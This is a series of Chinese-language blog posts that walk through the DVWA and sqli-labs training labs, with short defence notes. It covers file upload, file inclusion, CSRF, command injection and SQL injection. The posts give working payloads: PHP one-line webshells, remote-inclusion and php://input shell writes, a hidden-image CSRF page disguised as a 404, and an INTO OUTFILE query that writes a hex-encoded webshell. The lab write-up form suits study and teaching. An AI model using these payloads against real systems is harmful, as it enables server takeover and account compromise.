Inlcusion</h1><blockquote><blockquote><blockquote></blockquote><p>1、./是当前目录<br>2、../是父级目录<br>3、/是根目录</p><blockquote></blockquote></blockquote></blockquote><h2 id="LOW-1"><a href="#LOW-1" class="headerlink" title="LOW"></a>LOW</h2><p>通过代码可看出未对文件上传做任何限制，直接上传带有一句话木马的PHP文件<br><img src="./8.png" srcset="/img/loading.gif" alt=""></p><h2 id="MEDIUM-1"><a href="#MEDIUM-1" class="headerlink" title="MEDIUM"></a>MEDIUM</h2><p><img src="./9.png" srcset="/img/loading.gif" alt=""><br>发现源代码对文件上传的后缀名做了限制<br>直接上传带有一句话木马的png图片<br><img src="./10.png" srcset="/img/loading.gif" alt=""></p><h3 id="扯到了菜刀原理"><a href="#扯到了菜刀原理" class="headerlink" title="扯到了菜刀原理"></a>扯到了菜刀原理</h3><p>上传成功，使用菜刀连接。显示连接失败<br>中国菜刀的原理是向上传文件发送包含123参数的post请求，通过控制123参数来执行不同的命令，而这里服务器将木马文件解析成了图片文件，因此向其发送post请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。//</p><h3 id="解决方案-分析源码"><a href="#解决方案-分析源码" class="headerlink" title="解决方案(分析源码)"></a>解决方案(分析源码)</h3><p>啰嗦这么多原因就是<br>由于服务器解析成图片无法执行post命令<br>使用burpsuite抓包改，上传*。png文件，将后缀名改位php上传<br>//原理分析，在加载网页时候，php脚本已经加载完在浏览器中，当点击UPLOAD浏览器执行PHP脚本判断文件类型，但是burpsuite截取的是发送的http请求。所以这里burpsuite抓包显示已经对文件类型做出了判断为png。<br><img src="./11.png" srcset="/img/loading.gif" alt=""><br><img src="./12.png" srcset="/img/loading.gif" alt=""></p><h2 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h2><p>high代码通过if条件语句判断文件后缀名+grtmagesize()限制上传文件内容的文件头必须带有图片后缀名才能上传成功<br>通过windows自带的<code>copy</code>命令将php文件与png图片合成</p><h3 id="使用burpsuite无法修改后缀为php解决方案"><a href="#使用burpsuite无法修改后缀为php解决方案" class="headerlink" title="使用burpsuite无法修改后缀为php解决方案"></a>使用burpsuite无法修改后缀为php解决方案</h3><p>通过<code>burpsuite</code>截取改后缀名时无法成功，在服务端直接对文件后缀名判断。而<code>medium</code>只是对<code>content-type</code>做出了判断。<br><img src="./13.png" srcset="/img/loading.gif" alt=""></p><p><img src="./14.png" srcset="/img/loading.gif" alt=""></p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>使用HIGH下的<code>COMMAND Injection</code><br><code>|dir</code>得出文件路径,结合uploads 时的路径提示</p><blockquote><blockquote><p><code>F:\phpstudy\PHPTutorial\WWW\zlzhidao\vulnerabilities\hackable\uploads\new1.png</code></p></blockquote></blockquote><p>修改后缀名命令</p><blockquote><blockquote><p><code>127.0.0.1|  |rename ..\\..\\hackable\\uploads\\new1.png new1.php</code></p></blockquote></blockquote><p><img src="./15.png" srcset="/img/loading.gif" alt=""></p><p>修改成功 使用菜刀连接<br><img src="./16.png" srcset="/img/loading.gif" alt=""><br><img src="./17.png" srcset="/img/loading.gif" alt=""></p><h1 id="PHP文件包含利用"><a href="#PHP文件包含利用" class="headerlink" title="PHP文件包含利用"></a>PHP文件包含利用</h1><h2 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h2><p>访问url: <code>http://www.123.com/index.php?page=/etc/passwd</code>，存在若有相应权限读出文件内容。反之得出：<code>open_basedir restriction in effect</code>警告<br>常见敏感信息如下：<br><img src="./18.png" srcset="/img/loading.gif" alt=""></p><h2 id="远程包含shell"><a href="#远程包含shell" class="headerlink" title="远程包含shell"></a>远程包含shell</h2><p>条件：<code>allow_url_fopen</code>选项是激活的</p><ol><li>远程木马存在地址<code>http://www.example.com/echo.txt</code><br><strong>文件内容<code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;mima&#39;]);?&gt;&quot;)?&gt;</code></strong></li></ol><ol start="2"><li>执行url：<code>http://www.123.com/index.php?page=http://www.example.com/echo.txt</code><br><strong>写入一句话木马<code>&lt;?php eval($_POST[&#39;mima&#39;]);?&gt;</code></strong></li></ol><h2 id="本地包含配合文件上传"><a href="#本地包含配合文件上传" class="headerlink" title="本地包含配合文件上传"></a>本地包含配合文件上传</h2><p>上传文件后，使用文件包含漏洞访问。这里就不赘述了。 </p><h2 id="PHP封装协议"><a href="#PHP封装协议" class="headerlink" title="PHP封装协议"></a>PHP封装协议</h2><p>PHP内置协议如图，与<code>fopen(),copy(),file_exists(),filesize()</code>等文件系统函数所提供功能相似<br><img src="./19.png" srcset="/img/loading.gif" alt=""></p><ol><li><p>封装协议读取PHP文件<br><code>http://www.123.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php</code><br>上文试题也有详细操作，就不赘述了。</p></li><li><p>写入PHP文件<br>使用 <code>php://input</code><br>条件：<code>allow_url_include()</code> 为 <code>On</code><br>URL:<code>http://192.168.43.195/DVWA/vulnerabilities/fi/?page=php://input</code><br><code>&lt;?php system(&#39;net user&#39;);?&gt;</code><br><img src="./20.png" srcset="/img/loading.gif" alt=""></p></li></ol><p>使用写入一句话木马也是可以 得使用<code>fputs</code>和 <code>fopen</code>函数</p><h2 id="包含Apache日志文件"><a href="#包含Apache日志文件" class="headerlink" title="包含Apache日志文件"></a>包含Apache日志文件</h2><p>访问<code>http://www.123.com/&lt;?php phpinfo() ?&gt;</code> 使用<code>burpsuite HTTP</code>编辑器发送，就不会被浏览器转义。已知日志路径就能访问一句话木马了。</p><h2 id="截断包含"><a href="#截断包含" class="headerlink" title="截断包含"></a>截断包含</h2><p>在图片路径后加上%00 会以PHP方式解析<br>条件：<code>magic_qutotes_gpc = Off</code><br>为ON 转义 <code>&#39;、&quot;、\、NULL</code></p><h1 id="安全编写包含"><a href="#安全编写包含" class="headerlink" title="安全编写包含"></a>安全编写包含</h1><p>造成包含漏洞原因是被包含页面可控</p><ul><li><strong>参数可被控制</strong></li><li><strong>路径限制，禁止目录跳转字符”../“</strong></li><li><strong>包含文件验证：验证是否是白名单中的参数</strong></li><li><strong>尽量不使用动态包含，写死网页 include(“head.php”)</strong></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>LFI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA_CSRF</title>
    <link href="/2018/12/27/DVWA-CSRF/"/>
    <url>/2018/12/27/DVWA-CSRF/</url>
    
    <content type="html"><![CDATA[<h2 id="前沿"><a href="#前沿" class="headerlink" title="前沿"></a>前沿</h2><blockquote><blockquote><blockquote></blockquote><p>CSRF，跨站请求伪造，区别与XSS。CSRF直接利用用户cookie进行非法操作，如转账，改密</p><blockquote></blockquote></blockquote></blockquote><h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><p>分析源码可知，创建非法链接<br><a href="http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1&amp;password_conf=1&amp;Change=Change#" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1&amp;password_conf=1&amp;Change=Change#</a><br>当用户点击该链接直接修改密码成功<br><img src="./1.png" srcset="/img/loading.gif" alt=""><br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h3 id="隐匿非法url"><a href="#隐匿非法url" class="headerlink" title="隐匿非法url"></a>隐匿非法url</h3><p>1）url地址缩短<br>2)构造有效的test.html网页，将url放入标签中自动触发</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1&amp;password_conf=1&amp;Change=Change#"</span> <span class="hljs-attr">border</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:none;"</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>file not found.<span class="hljs-tag">&lt;<span class="hljs-name">h2</span></span></code></pre><h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p><img src="./3.png" srcset="/img/loading.gif" alt=""><br>1）从medium源码可以得出，修改密码需满足请求用户的网址与host相同。<br>构造可以通过本机去访问带有目标IP地址的网页 。<br>使用eregi检验HOST 是否与 请求的REFFER参数值相等（即验证是否为同一个用户访问），相同则修改密码。<br>方法：<br>创建有效test.html页面，将html网页命名为被攻击者IP地址。试图使得被攻击者点击该文件。使得密码修改成功</p><p>2)将<code>&lt;img src=&quot;/DVWA/vulnerabilities/csrf/?password_new=1&amp;password_conf=1&amp;Change=Change#&quot;&gt;</code>放于stored xss中<br>也能够达成修改密码的目的</p><ol><li>捕捉修改密码的GET请求路径<code>/DVWA/vulnerabilities/csrf/?password_new=1&amp;password_conf=1&amp;Change=Change#</code></li><li>在stored xss&gt;&gt;NAME值中填入<code>&lt;img src=&quot;/DVWA/vulnerabilities/csrf/?password_new=12345&amp;password_conf=12345&amp;Change=Change#&quot;&gt;</code></li></ol><p>当用户访问评论区时，密码就被我们修改了。达到攻击者的目的<br><img src="./5.png" srcset="/img/loading.gif" alt=""><br><img src="./6.png" srcset="/img/loading.gif" alt=""><br><img src="./7.png" srcset="/img/loading.gif" alt=""></p><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>HIGH等级中加入Anti-CSRF机制。具体可以看我的机制内容可以看我下面的博客。<br>所以我们要在服务器端放置能获取用户token的恶意代码。并执行修改密码操作<br>创建表单</p><pre><code class="hljs pgsql">&lt;form action="http://127.0.0.1/zlzhidao/vulnerabilities/csrf/" <span class="hljs-keyword">method</span>="GET"&gt;<span class="hljs-built_in">New</span> <span class="hljs-keyword">password</span>:&lt;br /&gt;&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>="password" AUTOCOMPLETE="on" <span class="hljs-type">name</span>="password_new" <span class="hljs-keyword">value</span>="123456"&gt;&lt;br /&gt;Confirm <span class="hljs-built_in">new</span> <span class="hljs-keyword">password</span>:&lt;br /&gt;&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>="password" AUTOCOMPLETE="on" <span class="hljs-type">name</span>="password_conf" <span class="hljs-keyword">value</span>="123456"&gt;&lt;br /&gt;&lt;br /&gt;&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>="submit" <span class="hljs-keyword">value</span>="Change" <span class="hljs-type">name</span>="Change"&gt;&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">'hidden'</span> <span class="hljs-type">name</span>=<span class="hljs-string">'user_token'</span> <span class="hljs-keyword">value</span>=<span class="hljs-string">'e86256b6638005a27e64693e8fcd20be'</span> /&gt;&lt;/form&gt;</code></pre><p>保存文件名为test.html<br>使得test.html在目前网页打开。即可修改密码成功<br><img src="./8.png" srcset="/img/loading.gif" alt=""><br>当然我们得使用社工等手段来获取token值，或者通过stored xss也是行的通的</p>]]></content>
    
    
    
    <tags>
      
      <tag>CSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA_(Command Injection)</title>
    <link href="/2018/12/27/DVWA%E7%B3%BB-Command-Injection/"/>
    <url>/2018/12/27/DVWA%E7%B3%BB-Command-Injection/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><blockquote><blockquote></blockquote><p>命令注入是一种攻击，其目标是通过易受攻击的应用程序在主机操作系统上执行任意命令。当应用程序将不安全的用户提供的数据&gt;（表单，cookie，HTTP标头等）传递给系统shell时，可能会发生命令注入攻击。在此攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的权限执行。命令注入攻击很可能主要是由于输入验证不足。<br>此攻击与代码注入不同，因为代码注入允许攻击者添加自己的代码，然后由应用程序执行。在命令注入中，攻击者扩展了执行系统命令的应用程序的默认功能，而无需注入代码。</p><blockquote></blockquote><p>command Injection&gt;&gt;借助PHP对服务端shell的启用&gt;&gt;攻击者插入恶意shell命令</p></blockquote></blockquote><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>源码分析<br><img src="./1.png" srcset="/img/loading.gif" alt=""><br>PHP执行流程&gt;&gt;传入IP地址&gt;&gt;php判断操作系统类型&gt;&gt;执行PING命令<br>从源码可分析，未对IP地址过滤。可以采用IP&amp;&amp;dos 命令对操作系统恶意操作<br>写入一句话<br>echo “<?php @eval($_POST['123'])?>“&gt;F:\phpstudy\PHPTutorial\WWW\DVWA\vulnerabilities\post123.php<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p>对IP &amp;&amp; ;; 进行过滤<br><img src="./3.png" srcset="/img/loading.gif" alt=""><br>1)我们可以通过&amp;和;混搭，欺骗过滤函数，测试代码如下<br>2) command1&amp;command2 先执行command1，不管是否成功，都会执行command2</p><h2 id="higth"><a href="#higth" class="headerlink" title="higth"></a>higth</h2><p>‘| ’ 过滤出现了差错<br><img src="./4.png" srcset="/img/loading.gif" alt=""><br>Command 1 | Command 2<br>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p><h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p>对传入参数，对IP做约束。使得用户只能输入IP地址。<br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p><code>摘自OWASP</code><br>理想情况下，开发人员应使用现有的API作为其语言。例如（Java）：使用位于javax.mail的可用Java API，而不是使用Runtime.exec（）发出’mail’命令。<br>如果不存在此类可用API，则开发人员应清除所有恶意字符输入。实施积极的安全模型将是最有效的。通常，定义合法字符要比非法字符容易得多。</p><h1 id="命令执行执行模型"><a href="#命令执行执行模型" class="headerlink" title="命令执行执行模型"></a>命令执行执行模型</h1><blockquote><blockquote><blockquote></blockquote><p><strong>命令执行漏洞可以执行系统命令，代码执行漏洞也会执行系统命令</strong></p></blockquote></blockquote><ul><li><strong>命令执行漏洞是直接调用操作系统命令，叫做OS命令执行漏洞</strong></li><li><strong>代码执行漏洞则是靠执行脚本代码调用操作系统命令</strong></li></ul><h1 id="PHP命令执行"><a href="#PHP命令执行" class="headerlink" title="PHP命令执行"></a>PHP命令执行</h1><p>函数system()、shell_exec()、exec()和passthru()</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a><strong>命令执行</strong></h2><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span> </span><span class="php">    $host=$argv[<span class="hljs-number">1</span>];</span><span class="php">    system(<span class="hljs-string">"ping"</span>,$host);</span><span class="php">&gt;</span></code></pre><p>执行命令  <code>&quot;php.exe cmd.php www.123.com&quot;</code></p><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a><strong>代码执行</strong></h2><p><code>eval()</code> 解析括号中的内容</p><h2 id="动态函数调用"><a href="#动态函数调用" class="headerlink" title="动态函数调用"></a><strong>动态函数调用</strong></h2><ol><li><p><strong>危险代码一</strong>：</p><pre><code class="hljs kotlin">&lt;?phpfunction A()&#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">"A()函数.."</span>;&#125;function B()&#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">"B()函数.."</span>;&#125;$<span class="hljs-function"><span class="hljs-keyword">fun</span> = $_REQUESTS['<span class="hljs-keyword">fun</span>'];</span>echo $<span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">()</span></span>&gt;</code></pre><p>PHP根据$fun值来调用对应函数，如<code>&quot;http://www.123.com/function.php?fun=phpinfo&quot;</code><br>就会输出函数<code>phpinfo()</code></p></li><li><p><strong>危险代码二</strong></p><pre><code class="hljs kotlin">&lt;?php    $<span class="hljs-function"><span class="hljs-keyword">fun</span> = $_GET['<span class="hljs-keyword">fun</span>'];</span>    $par = $_GET[<span class="hljs-string">'par'</span>];    $<span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">($par)</span></span>&gt;</code></pre><p><code>&quot;http://www.123.com/funtion.php/?fun=system&amp;par=net user&quot;</code>组成函数为<code>system(&quot;net user&quot;)</code></p></li></ol><h2 id="PHP函数代码执行漏洞"><a href="#PHP函数代码执行漏洞" class="headerlink" title="PHP函数代码执行漏洞"></a>PHP函数代码执行漏洞</h2><p><code>preg_replace()、ob_start()、array_map()</code></p><pre><code class="hljs angelscript">&lt;?php    $arr = $_GET[<span class="hljs-string">'arr'</span>];    $<span class="hljs-built_in">array</span> = <span class="hljs-built_in">array</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>);    $new_array = <span class="hljs-built_in">array</span>_map(%arr,$<span class="hljs-built_in">array</span>);?&gt;</code></pre><p><code>http://192.168.43.195/xxx.php?arr=phpinfo</code><br><img src="./6.png" srcset="/img/loading.gif" alt=""></p><p>还有关于JAVA、框架命令执行漏洞等知识充沛在接触.</p><h1 id="防范命令执行漏洞"><a href="#防范命令执行漏洞" class="headerlink" title="防范命令执行漏洞"></a>防范命令执行漏洞</h1><ul><li><strong>尽量不使用系统执行命令</strong></li><li><strong>执行命令函数或方法之前，变量做好过滤</strong></li><li><strong>使用动态函数之前，确保必须是使用指定函数</strong></li><li><strong>无法控制危险函数最好不要使用</strong></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlilabs38-65</title>
    <link href="/2018/12/23/sqlilabs38-65/"/>
    <url>/2018/12/23/sqlilabs38-65/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01堆栈查询"><a href="#0x01堆栈查询" class="headerlink" title="0x01堆栈查询"></a>0x01堆栈查询</h1><h2 id="堆栈查询解析"><a href="#堆栈查询解析" class="headerlink" title="堆栈查询解析"></a>堆栈查询解析</h2><p>堆栈查询，说白了就是在加一个查询语句。但个人认为union 联合注入比较靠谱。</p><p>局限性：</p><ol><li>堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。 所以延时注入，差错注入都行不通。</li><li>条件是使用了<code>mysql_multi_query()</code>//为了验证数据库而使用</li></ol><h2 id="less38-39"><a href="#less38-39" class="headerlink" title="less38-39"></a>less38-39</h2><p>less38字符型，less39数字型注入</p><p>以less38为例<br>构造payload:<code>1&#39;;insert into users values (&#39;39&#39;,&#39;osowrd&#39;,&#39;osowrd&#39;)--+</code><br>成功插入新数据，<code>38 osword osword</code><br>notice：id列数值尽量大，考虑表没有对id添加自增属性<br><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h2 id="less40-41"><a href="#less40-41" class="headerlink" title="less40-41"></a>less40-41</h2><ul><li>less40&gt;&gt;注入类型：id=1’)–+  .错误不回显，</li><li>less41&gt;&gt;注入类型：id=1–+,错误不回显，</li></ul><h2 id="less42-45"><a href="#less42-45" class="headerlink" title="less42-45"></a>less42-45</h2><p>42~45都是相同的，区别就是过滤的形式不一样。<br>以less42讲解<br>源码分析:对登陆账户使用<code>mysql_real_escape_string()</code>过滤。<br>而登陆密码却无过滤<br><img src="./2.png" srcset="/img/loading.gif" alt=""><br>构造stack injection</p><p><code>admin=admin</code><br><code>passwd=c&#39;;insert into users values (&#39;40&#39;,&#39;less42&#39;,&#39;less42&#39;)#</code></p><p>成功插入<br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x02-order-by-注入"><a href="#0x02-order-by-注入" class="headerlink" title="0x02 order by 注入"></a>0x02 order by 注入</h1><p>从mysql帮助文档可知，<code>order by</code> 后可以添加表达式。可以采用报错注入，延时注入<br><img src="./4.png" srcset="/img/loading.gif" alt=""><br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><h2 id="参数注入"><a href="#参数注入" class="headerlink" title="参数注入"></a>参数注入</h2><h3 id="less46"><a href="#less46" class="headerlink" title="less46"></a>less46</h3><p>借用 <code>order by</code> 后参数注入</p><ol><li>添加注入语句，<code>?sort=(select *****)</code>//需要注意的是sort争对单列来排序，所以select 后检索个数为1.</li><li>利用函数，如rand(),随机出其他字段值<br><code>rand(trure),rand(false)</code>值不同判断条件语句<br><code>?sort=rand(ascii(substr(database()1,1,))=115)</code><br><code>?sort=rand(ascii(substr(database(),1,1))=114)</code></li><li>利用<code>and</code>&gt;&gt; <code>?sort=1 and （加sql语句）</code><br><img src="./6.png" srcset="/img/loading.gif" alt=""><br><img src="./7.png" srcset="/img/loading.gif" alt=""></li></ol><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><blockquote><blockquote><p><code>?sort=(select  count(*) from information_schema.columns group by  concat(0x7e,(select user()),0x7e,floor(rand(0)*2)))</code><br><img src="./8.png" srcset="/img/loading.gif" alt=""></p></blockquote></blockquote><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>?sort=(IF(ascii(substr(database(),1,1))=114),1,sleep(5))//故意整错看效果<br><img src="./9.png" srcset="/img/loading.gif" alt=""></p><h3 id="函数注入判断"><a href="#函数注入判断" class="headerlink" title="函数注入判断"></a>函数注入判断</h3><p>rand()&gt;&gt;rand(true) / rand(false)//有表单显示才能判断<br>搭配:<code>?sort=1 and</code> 盲注操作。</p><h2 id="procedure-analyse-注入"><a href="#procedure-analyse-注入" class="headerlink" title="procedure analyse 注入"></a>procedure analyse 注入</h2><p>prodedure analyse在windows下可执行，ubuntu mysql 5.7执行不了，具体原因未可知。<br>windows环境下<br><code>?sort procedure analyse(extractvalue(1,concat(0x3a,database())),1)</code><br><img src="./10.png" srcset="/img/loading.gif" alt=""><br><img src="./11.png" srcset="/img/loading.gif" alt=""></p><h2 id="导入导出文件"><a href="#导入导出文件" class="headerlink" title="导入导出文件"></a>导入导出文件</h2><p><img src="./12.png" srcset="/img/loading.gif" alt=""><br><code>?sort=1  into outfile &#39;F:\\phpstudy\\PHPTutorial\\WWW\\sqlilabs\\Less-46\\1.php&#39;</code><br><img src="./13.png" srcset="/img/loading.gif" alt=""><br><img src="./14.png" srcset="/img/loading.gif" alt=""></p><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>利用 <code>lines terminated by</code><br>payload: <code>?sort=1 into outfile &#39;F:\\phpstudy\\PHPTutorial\\WWW\\sqlilabs\\Less-46\\less46.php&#39; lines terminated by 3c3f70687020406576616c28245f504f53545b276d696d61275d293f3e</code><br><img src="./15.png" srcset="/img/loading.gif" alt=""><br><img src="./16.png" srcset="/img/loading.gif" alt=""></p><h2 id="less47-49-见解"><a href="#less47-49-见解" class="headerlink" title="less47-49(见解)"></a>less47-49(见解)</h2><p>基于无错误返回进行注入。延时，盲注都行的通就不一一写了<br>见解：<code>sort=rand()</code>可以判断是否可以添加<code>(select **)</code>和判断整型，<br>若是字符串只能用<code>and</code>注入，或<code>procedure analyse()</code></p><h2 id="less50-53"><a href="#less50-53" class="headerlink" title="less50-53"></a>less50-53</h2><p>PHP中使用了mysql_multi_query()函数，使得能够使用堆栈注入。这里就不演示了</p><h1 id="0x03-challenge"><a href="#0x03-challenge" class="headerlink" title="0x03 challenge"></a>0x03 challenge</h1><h2 id="less54-65-challenge"><a href="#less54-65-challenge" class="headerlink" title="less54-65(challenge)"></a>less54-65(challenge)</h2><p>实则就是增加了对查询次数限制<br>小BUG：页面后退就不会添加查询次数了<br>爆表名&gt;&gt;列名&gt;&gt;得出字段<br>yaon9gl5wo<br><img src="./17.png" srcset="/img/loading.gif" alt=""></p><p>secret_N3BG<br><img src="./18.png" srcset="/img/loading.gif" alt=""></p><p>RSIG77DiEpN3UnUgnRgVd5wC<br><img src="./19.png" srcset="/img/loading.gif" alt=""><br>往后的就是对less54各种变形就不一一写了。</p><h1 id="0x04年终总结"><a href="#0x04年终总结" class="headerlink" title="0x04年终总结"></a>0x04年终总结</h1><ul><li>通过sqlilabs了解了基本的注入方法</li><li>掌握了浏览器和tomact、数据库交互过程</li><li>用python脚本进行sql注入编写能够更准确掌握和理解sql语句</li><li>基本看了每个less源代码，学习php与数据库交互的形式和逻辑。<br>……………………………..</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlilabs23-28</title>
    <link href="/2018/12/22/sqlilabs23-28/"/>
    <url>/2018/12/22/sqlilabs23-28/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-less23"><a href="#0x01-less23" class="headerlink" title="0x01 less23"></a>0x01 less23</h2><h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><pre><code class="hljs elixir">preg_replace函数执行一个正则表达式的搜索和替换。<span class="hljs-variable">$ </span>result = preg_replace（<span class="hljs-string">'/ abc /'</span>，<span class="hljs-string">'def'</span>，<span class="hljs-variable">$ </span>string）; ＃用<span class="hljs-string">'def'</span>替换所有<span class="hljs-string">'abc'</span><span class="hljs-variable">$ </span>result = preg_replace（<span class="hljs-string">'/ abc / i'</span>，<span class="hljs-string">'def'</span>，<span class="hljs-variable">$ </span>string）; ＃替换为不区分大小写的匹配<span class="hljs-variable">$ </span>result = preg_replace（<span class="hljs-string">'/ \ s + /'</span>，<span class="hljs-string">''</span>，<span class="hljs-variable">$ </span>string）; ＃删除所有空格对注释符号 -- ， <span class="hljs-comment">#  过滤</span></code></pre><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>payload需要闭合id前后单引号<br>构造payload：<code>-1&#39;(闭合id前引号) union select 1,@@datadir,&#39;3（闭合id后引号）</code><br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p>因为值能输出一个select查询值，id=-1作用使得union前的select语句查询无效<br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>利用报错注入和延时注入 可以采用的后缀payload为:<code>or &#39;1&#39;=&#39;1</code> 进行闭合。<br>xml报错payload：<code>id=1 &#39; or extractvalue(1,concat(0x7e,(select database()),0x7e)) or &#39;1&#39;=&#39;1</code><br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><p>爆库长度:<code>?id=-1&#39;%20 union select 1,length(database()),&#39;2</code><br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><h2 id="0x02-less24"><a href="#0x02-less24" class="headerlink" title="0x02 less24"></a>0x02 less24</h2><h3 id="session定义"><a href="#session定义" class="headerlink" title="session定义"></a>session定义</h3><p>参考链接:<a href="https://blog.csdn.net/zhengxijia2012/article/details/73437376" target="_blank" rel="noopener">https://blog.csdn.net/zhengxijia2012/article/details/73437376</a></p><ol><li>保持用户与服务端接通状态</li><li>弥补了HTTP无状态协议</li><li>会话的发明使得一个用户在多个页面间切换时能够保存他的信息,所以seesion注册的变量为全局变量</li><li>唯一的标识符，会话ID，存放在客户端的 cookie，要么经由 URL传递<br>作用：身份认证，程序状态记录，页面之间参数传递<h3 id="session函数"><a href="#session函数" class="headerlink" title="session函数"></a>session函数</h3>PHP5使用<code>$_SESSION[‘xxx’]=xxx</code>注册SESSION全局变量<br><code>session_start()</code>:开始一个会话或者返回已存在的会话<br>执行条件：</li><li>php.ini启用了session.auto_start=1</li><li>调用之前浏览器不能有任何输出，包括类的调用<h3 id="分析less24源码"><a href="#分析less24源码" class="headerlink" title="分析less24源码"></a>分析less24源码</h3>代码比较少就一个个PHP文件查看，分析各个PHP执行的流程和跳转的条件。学习执行Sql语句情况<br>查看<code>index.php</code>。由于各个文件PHP都指向了<code>index.php</code>，而<code>index.php</code>判断<code>session</code>和<code>cookie</code>创建之后链接到<code>logged-in.php</code>.所以会造成不用在<code>url</code>填入<code>*.php</code>都会链接到<code>logged-in.php</code><br><img src="./6.png" srcset="/img/loading.gif" alt=""></li></ol><p>login.php：创建session cookie，导向logged-in.php<br><img src="./7.png" srcset="/img/loading.gif" alt=""></p><p>logged-in.php:重置密码之后，触发submit=submit，跳转pass_change.php<br><img src="./8.png" srcset="/img/loading.gif" alt=""><br><img src="./9.png" srcset="/img/loading.gif" alt=""></p><p>pass_change.php:<code>$pass=$re_pass</code>相同&gt;&gt;执行sql语句&gt;&gt;where 判断<code>username</code>，<code>curr_pass</code>是否匹配数据库&gt;&gt;$row数组非空&gt;&gt;密码修改成功<br>若触发logout <code>(submit=submit1</code>)&gt;&gt;删除<code>session</code>,<code>cookie</code><br><img src="./10.png" srcset="/img/loading.gif" alt=""><br><img src="./11.png" srcset="/img/loading.gif" alt=""></p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次排序注入：也称位存储型注入，将可能造成sql注入的语句存入到数据库中，当再次调用这个恶意构造的字符时，就可以发出sql注入。<br>二次排序注入思路：</p><ul><li>构造数据payload1，在浏览器或其他软件提交HTTP数据报文到服务端处理，报文中带有恶意构造的sql语句或命令。</li><li>服务端会将构造的数据payload1存储，通常保存在数据库中。保存的目的是服务端与客服端做交互时提供数据基础。</li><li>第二次构造数据payload2，发送与第一次构造的payload1不同数据</li><li>服务端会处理第二个请求，为了处理该请求，服务端会访问数据库并处理该请求。导致请求会在payload1中的服务环境中执行。</li><li>服务端返回的处理结果可以判断是否为二次注入。<h3 id="less24二次注入演示"><a href="#less24二次注入演示" class="headerlink" title="less24二次注入演示"></a>less24二次注入演示</h3>payload：注册账户为admin’#，登陆修改密码，修改为admin密码<br><img src="./12.png" srcset="/img/loading.gif" alt=""><br><img 